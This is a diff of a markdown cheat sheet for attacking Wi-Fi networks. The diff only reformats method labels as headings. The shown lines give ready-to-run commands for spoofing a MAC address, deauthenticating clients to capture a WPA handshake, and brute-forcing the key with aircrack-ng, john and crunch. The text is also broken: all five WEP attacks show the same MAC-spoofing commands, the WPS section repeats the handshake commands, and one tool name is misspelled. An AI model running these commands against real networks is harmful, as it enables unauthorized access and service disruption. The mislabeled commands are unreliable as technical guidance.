@@ -77,35 +77,35 @@
   > ifconfig wlan0 
   ```
   ### WEP 
-  Method 1 - Fake Authentication Attack
+  ##### Method 1 - Fake Authentication Attack
 ```Bash
   > ifconfig wlan0 down
   > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
   > ifconfig wlan0 up 
   > ifconfig wlan0 
   ```
-  Method 2 - ARP Replay Attack
+  ##### Method 2 - ARP Replay Attack
 ```Bash
   > ifconfig wlan0 down
   > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
   > ifconfig wlan0 up 
   > ifconfig wlan0 
   ```
-  Method 3 - Chop Chop Attack
+ ##### Method 3 - Chop Chop Attack
 ```Bash
   > ifconfig wlan0 down
   > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
   > ifconfig wlan0 up 
   > ifconfig wlan0 
   ```
-  Method 4 - Fragmentation Attack
+  ##### Method 4 - Fragmentation Attack
 ```Bash
   > ifconfig wlan0 down
   > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
   > ifconfig wlan0 up 
   > ifconfig wlan0 
   ```
-  Method 5 - SKA (Shared Key Authentication) Type Cracking
+  ##### Method 5 - SKA (Shared Key Authentication) Type Cracking
 ```Bash
   > ifconfig wlan0 down
   > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
@@ -116,33 +116,33 @@
    ### WPA/WPA2
    #### Capture Handshake File
    
-  Method 1 - Fake Authentication Attack
+  ##### Method 1 - Fake Authentication Attack
 ```Bash
   > airodump-ng --bssid AP:MA:C0:EE:VV --channel 11 --write handshakefilename mon0
   > airplay-ng --deauth 4 -a AP:MA:C0:EE:VV -c CL:IE:NT:MA:C0 mon0
   ```
    #### Exploiting WPS
-   Method 1 - Fake Authentication Attack
+   ##### Method 1 - Fake Authentication Attack
 ```Bash
   > airodump-ng --bssid AP:MA:C0:EE:VV --channel 11 --write handshakefilename mon0
   > airplay-ng --deauth 4 -a AP:MA:C0:EE:VV -c CL:IE:NT:MA:C0 mon0
   ```
   #### Wordlist Attack
-   Method 1 - Using aircrack-ng
+   ##### Method 1 - Using aircrack-ng
 ```Bash
   > aircrack-ng handshake.cap -w wordlist.txt
   ```
    
-   Method 2 - Saving Aircrack-ng Cracking Progress
+   ##### Method 2 - Saving Aircrack-ng Cracking Progress
 ```Bash
   > john --wordlist=wordlist.txt --stdout --session=upc | aircrack-ng -w - -b 00:uu:sd:23:56 handshake.cap
   > john --restore=upc | aircrack-ng -w - -b 00:uu:sd:23:56 handshake.cap
   ```
-   Method 3 - Using Huge Wordlists With Aircrack-ng Without Wasting Storage
+   ##### Method 3 - Using Huge Wordlists With Aircrack-ng Without Wasting Storage
 ```Bash
   > crunch 8 8 | aircrack-ng -b 00:uu:sd:23:56 -w - handshake.cap
   ```
-   Method 4 - Saving Cracking Progress When Using Huge Wordlists Without Wasting Storage
+   ##### Method 4 - Saving Cracking Progress When Using Huge Wordlists Without Wasting Storage
 ```Bash
   > crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b 00:uu:sd:23:56 -w - handshake.cap
   > crunch 8 8 | john --stdin --restore=session1 | aircrack-ng -b 00:uu:sd:23:56 -w - handshake.cap
